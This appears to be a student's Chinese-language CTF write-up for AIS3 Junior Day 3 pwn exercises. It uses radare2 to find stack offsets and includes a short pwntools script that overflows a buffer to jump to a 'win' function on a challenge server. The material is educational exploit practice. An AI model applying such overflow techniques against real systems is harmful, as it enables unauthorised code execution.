---
title: ais3 junior －－ Day3 writeup-Pwn篇 和碎碎念(如果有的話)
date: 2026-08-06
tags: [資安, Pwn]
categories: [ais3-junior]
---

# Pwn-1

`r2 ./00-challenges/AIS3-jr/hw/pwn/pwn01_local.out`
`aaa`
`VV`

![alt text](/img/a8-ais3-jr-Day3-Pwn/1-1.png)

password到is_admin
0x20 - 0x8 = 0x18 == 24

![alt text](/img/a8-ais3-jr-Day3-Pwn/1-2.png)

當值為`0xcafebabe`就會爆出flag

![alt text](/img/a8-ais3-jr-Day3-Pwn/1-3.png)

測試通過了

![alt text](/img/a8-ais3-jr-Day3-Pwn/1-4.png)

實際測試的時候少擷取到一行

# Pwn-2
一樣的起手式
`r2 ./00-challenges/AIS3-jr/hw/pwn/pwn02_local.out`
`aaa`
`VV`
![alt text](/img/a8-ais3-jr-Day3-Pwn/2-1.png)
沒有flag的跡象，題目說會有win function
`afl`列出所有function
![alt text](/img/a8-ais3-jr-Day3-Pwn/2-2.png)

`0x00401156    1 26           dbg.win`
`s dbg.win`
![alt text](/img/a8-ais3-jr-Day3-Pwn/2-3.png)
| 變數  | 位置  |
| --- | --- |
| buf | rbp - 0x20 |
| Saved RBP |  rbp  |
| Return Address | rbp + 0x08 |

![alt text]![alt text](/img/a8-ais3-jr-Day3-Pwn/2-4.png)

測試成功

![alt text](/img/a8-ais3-jr-Day3-Pwn/2-5.png)
```py    
import pwn
r = pwn.remote("165.154.226.158", "11038")
# r = pwn.process('00-challenges/AIS3-jr/hw/pwn/pwn02_local.out')
r.sendline(b'a'*(32 + 8)+pwn.p64(0x00401156))
print(r.recvall())
```

